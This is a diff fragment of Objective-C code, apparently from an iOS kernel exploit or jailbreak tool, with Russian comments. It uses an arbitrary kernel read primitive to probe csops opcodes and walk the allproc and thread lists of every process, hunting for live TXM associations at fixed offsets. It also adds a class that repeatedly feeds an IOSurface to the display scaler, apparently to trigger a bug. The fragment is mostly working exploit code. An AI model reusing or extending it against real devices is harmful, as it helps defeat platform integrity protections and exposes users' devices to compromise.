+    [r appendString:@"\n  --- csops-варианты: какой opcode драйвит TXM? ---\n"];
+    {
+        static const struct { unsigned int op; const char *name; uint32_t bufsz; } variants[] = {
+            { 5,  "CS_OPS_CDHASH", 20 },
+            { 7,  "CS_OPS_ENTITLEMENTS_BLOB", 4096 },
+            { 8,  "op 8", 4096 },
+            { 9,  "op 9", 64 },
+            { 10, "op 10", 64 },
+        };
+        for (int v = 0; v < 5; v++) {
+            uint8_t *vbuf = calloc(1, variants[v].bufsz);
+            int vres = csops(getpid(), variants[v].op, vbuf, variants[v].bufsz);
+            uint64_t assoc = 0;
+            kreadbuf(threadVA + 0x530, &assoc, 8);
+            kpNote(r, [NSString stringWithFormat:@"    csops(%s) → %d · наш +0x530 после: %#llx%@",
+                      variants[v].name, vres, (unsigned long long)assoc,
+                      assoc ? @"  ← АССОЦИАЦИЯ ПОЯВИЛАСЬ!" : @""]);
+            free(vbuf);
+            if (assoc) break;
+        }
+    }
+
+    // 10. Cross-process hunt for a LIVE association (+0x530 != 0) in any
+    //     thread of any process. task->threads offset is found empirically:
+    //     a qword in our task pointing at one of our thread_ts (or its +0x3c8
+    //     link — from the thread scan, +0x3c8/+0x3d0 are next/prev by object).
+    [r appendString:@"\n  --- скан всех процессов: живые TXM-ассоциации ---\n"];
+    {
+        uint64_t ourTVAs[8]; int nOur = 0;
+        {
+            thread_act_array_t al2 = NULL;
+            mach_msg_type_number_t ac2 = 0;
+            if (task_threads(mach_task_self(), &al2, &ac2) == KERN_SUCCESS && al2) {
+                for (mach_msg_type_number_t i = 0; i < ac2 && nOur < 8; i++) {
+                    uint64_t eVA = table + (uint64_t)sizeof_ipc_entry * (al2[i] >> 8);
+                    uint64_t oRaw = 0, kRaw = 0;
+                    if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "t2 ie_object", r)) continue;
+                    uint64_t pVA = kp_untag_ptr(oRaw);
+                    if (!kpLooksLikeKernelPointer(pVA)) continue;
+                    if (!kpRead(pVA + off_ipc_port_ip_kobject, &kRaw, 8, "t2 ip_kobject", r)) continue;
+                    uint64_t tVA = kp_untag_ptr(kRaw);
+                    if (kpLooksLikeKernelPointer(tVA)) ourTVAs[nOur++] = tVA;
+                }
+                for (mach_msg_type_number_t i = 0; i < ac2; i++) mach_port_deallocate(mach_task_self(), al2[i]);
+                vm_deallocate(mach_task_self(), (vm_address_t)al2, ac2 * sizeof(mach_port_t));
+            }
+        }
+        int threadsHeadOff = -1;
+        {
+            uint8_t tb2[0x400];
+            memset(tb2, 0, sizeof(tb2));
+            if (kpRead(selfTask, tb2, sizeof(tb2), "task threads probe", r)) {
+                for (uint32_t o = 0; o + 8 <= sizeof(tb2) && threadsHeadOff < 0; o += 8) {
+                    uint64_t q = 0;
+                    memcpy(&q, tb2 + o, 8);
+                    uint64_t va = kp_untag_ptr(q);
+                    for (int i = 0; i < nOur; i++) {
+                        if (va == ourTVAs[i] || va == ourTVAs[i] + 0x3c8) {
+                            threadsHeadOff = (int)o;
+                            kpNote(r, [NSString stringWithFormat:@"    task->threads head @ task+%#x → %#llx (link по +%#llx)",
+                                      o, (unsigned long long)va, (unsigned long long)(va - ourTVAs[i])]);
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+        if (threadsHeadOff < 0) {
+            kpNote(r, @"    task->threads не найден эмпирически — скан чужих процессов пропущен");
+        } else {
+            uint64_t sym2 = ksymbol(allproc);
+            uint64_t head2 = 0;
+            kpRead(sym2, &head2, sizeof(head2), "allproc head", r);
+            head2 = kp_untag_ptr(head2);
+            int procsScanned = 0, threadsScanned = 0, assocFound = 0;
+            uint64_t node2 = head2, prev2 = 0;
+            for (int n = 0; n < 1536 && kpLooksLikeKernelPointer(node2) && node2 != prev2; n++) {
+                uint64_t pr = 0, tk = 0, th = 0;
+                if (!kpRead(node2 + koffsetof(proc, proc_ro), &pr, 8, "xp proc_ro", r)) break;
+                pr = kp_untag_ptr(pr);
+                if (!kpLooksLikeKernelPointer(pr)) goto nextProc;
+                if (!kpRead(pr + off_proc_ro_pr_task, &tk, 8, "xp task", r)) goto nextProc;
+                tk = kp_untag_ptr(tk);
+                if (!kpLooksLikeKernelPointer(tk)) goto nextProc;
+                if (!kpRead(tk + threadsHeadOff, &th, 8, "xp threads head", r)) goto nextProc;
+                th = kp_untag_ptr(th);
+                {
+                    char pname[17] = {0};
+                    kreadbuf(node2 + off_proc_p_name, pname, 16);
+                    uint64_t tcur = th, tprev = 0;
+                    for (int t = 0; t < 64 && kpLooksLikeKernelPointer(tcur) && tcur != tprev; t++) {
+                        uint64_t assoc = 0;
+                        kreadbuf(tcur + 0x530, &assoc, 8);
+                        threadsScanned++;
+                        if (assoc) {
+                            assocFound++;
+                            uint64_t assocU = kp_untag_ptr(assoc);
+                            int tA = kpLooksLikeKernelPointer(assocU) ? kpVAType(assocU, tableVA) : -1;
+                            kpNote(r, [NSString stringWithFormat:@"    АССОЦИАЦИЯ [%s] thread_t=%#llx +0x530=%#llx (untag %#llx type=%@)",
+                                      pname, (unsigned long long)tcur, (unsigned long long)assoc,
+                                      (unsigned long long)assocU,
+                                      tA < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tA]]);
+                            if (kpLooksLikeKernelPointer(assocU)) {
+                                uint8_t ab[0x80];
+                                memset(ab, 0, sizeof(ab));
+                                if (kpRead(assocU, ab, sizeof(ab), "assoc struct dump", r)) {
+                                    for (uint32_t o = 0; o + 8 <= sizeof(ab); o += 8) {
+                                        uint64_t q = 0;
+                                        memcpy(&q, ab + o, 8);
+                                        if (q) kpNote(r, [NSString stringWithFormat:@"      assoc+0x%02x: %#018llx", o, (unsigned long long)q]);
+                                    }
+                                }
+                            }
+                        }
+                        uint64_t nxt = 0;
+                        kreadbuf(tcur + 0x3c8, &nxt, 8);
+                        tprev = tcur;
+                        tcur = kp_untag_ptr(nxt);
+                        if (tcur == th || tcur == tk + threadsHeadOff) break;
+                    }
+                }
+            nextProc:
+                procsScanned++;
+                uint64_t nxt2 = 0;
+                kreadbuf(node2, &nxt2, sizeof(nxt2));
+                prev2 = node2;
+                node2 = kp_untag_ptr(nxt2);
+            }
+            kpNote(r, [NSString stringWithFormat:@"    скан: %d процессов, %d тредов, живых ассоциаций: %d",
+                      procsScanned, threadsScanned, assocFound]);
+        }
+    }
+    return r;
+}
+
+@end
+
+@implementation KPM2ScalerTrigger
+
+- (void)startWithSurface:(IOSurfaceRef)surface {
+    self.surface = surface;
+    UIWindow *window = nil;
+    for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+        if ([scene isKindOfClass:[UIWindowScene class]] &&
+            scene.activationState != UISceneActivationStateUnattached) {
+            window = ((UIWindowScene *)scene).windows.firstObject;
+            if (window) break;
+        }
+    }
+    if (!window) return;
+
+    self.view = [[UIView alloc] initWithFrame:CGRectMake(window.bounds.size.width - 72, 40, 64, 64)];
+    self.view.userInteractionEnabled = NO;
+    // contentsGravity=resize + 32x32 → 64x64: scaler обязан работать каждый кадр.
+    self.view.layer.contentsGravity = kCAGravityResize;
+    self.view.layer.magnificationFilter = kCAFilterLinear;
+    self.view.layer.contents = (__bridge id)surface;
+    [window addSubview:self.view];
+
+    self.link = [CADisplayLink displayLinkWithTarget:self selector:@selector(tick:)];
+    if (@available(iOS 15.0, *)) {
+        self.link.preferredFrameRateRange = CAFrameRateRangeMake(30, 120, 120);
+    }
+    [self.link addToRunLoop:[NSRunLoop mainRunLoop] forMode:NSRunLoopCommonModes];
+}
+
+- (void)tick:(CADisplayLink *)link {
+    self.frame++;
+    IOSurfaceRef s = self.surface;
+    if (!s) return;
+    // Переписываем пиксели: compositor не может закешировать кадр.
+    if (IOSurfaceLock(s, 0, NULL) == kIOReturnSuccess) {
+        uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(s);
+        size_t bpr = IOSurfaceGetBytesPerRow(s);
+        for (uint32_t y = 0; y < 32; y++) {
+            uint32_t *row = (uint32_t *)(base + y * bpr);
+            for (uint32_t x = 0; x < 32; x++) {
+                row[x] = 0xFF000000u | (((self.frame + x) & 0xFF) << 16)
+                       | ((y & 0xFF) << 8) | ((self.frame >> 1) & 0xFF);
+            }
+        }
+        IOSurfaceUnlock(s, 0, NULL);
+    }
+    // Переназначение contents заставляет compositor заново взять поверхность.
+    self.view.layer.contents = nil;
+    self.view.layer.contents = (__bridge id)s;
+}
+
+- (void)stop {
+    [self.link invalidate];
+    self.link = nil;
+    [self.view removeFromSuperview];
+    self.view = nil;
+}
+
+@end
